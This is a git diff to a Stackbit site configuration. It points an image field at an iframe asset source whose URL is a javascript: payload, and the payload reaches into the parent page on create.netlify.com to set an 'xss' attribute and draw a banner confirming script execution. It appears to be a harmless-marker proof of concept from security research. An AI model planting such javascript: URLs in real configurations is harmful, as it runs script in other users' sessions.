@@ -23,7 +23,7 @@ export default defineStackbitConfig({
           fields: [
             { name: 'title', type: 'string', required: true },
             { name: 'description', type: 'text' },
-            { name: 'heroImage', type: 'image' },
+            { name: 'heroImage', type: 'image', source: 'owned-iframe-source' },
             {
               name: 'customControl',
               type: 'string',
@@ -45,7 +45,7 @@ export default defineStackbitConfig({
     {
       name: 'owned-iframe-source',
       type: 'iframe',
-      url: "javascript:(()=>{parent.document.documentElement.setAttribute('data-create-asset-xss','confirmed');return '<!doctype html><body>safe marker</body>'})()"
+      url: "javascript:(()=>{parent.document.documentElement.setAttribute('data-create-asset-xss','confirmed');let b=parent.document.getElementById('asset-source-xss-proof');if(!b){b=parent.document.createElement('div');b.id='asset-source-xss-proof';parent.document.body.appendChild(b)}b.textContent='SECOND XSS CONFIRMED: asset-source javascript URL executed on create.netlify.com';Object.assign(b.style,{position:'fixed',top:'126px',left:'50%',transform:'translateX(-50%)',zIndex:'2147483647',background:'#7f1d1d',color:'#fff',padding:'12px 18px',borderRadius:'8px',font:'700 14px system-ui'});return '<!doctype html><body>safe marker</body>'})()"
     }
   ]
 });
